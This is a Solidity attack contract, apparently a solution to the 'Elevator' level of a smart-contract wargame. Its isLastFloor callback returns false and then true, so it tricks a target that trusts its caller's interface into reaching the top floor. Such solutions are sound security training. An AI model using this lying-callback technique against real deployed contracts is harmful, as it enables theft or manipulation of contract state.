// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttack {
    IElevator public challenge;
    uint256 public counter;

    constructor(address challengeAddress) {
        challenge = IElevator(challengeAddress);
    }

    function attack() external payable {
        challenge.goTo(0);
    }

    function isLastFloor(uint256 floor) external returns (bool) {
        counter++;
        if (counter > 1) {
            return true;
        } else {
            return false;
        }
    }
}
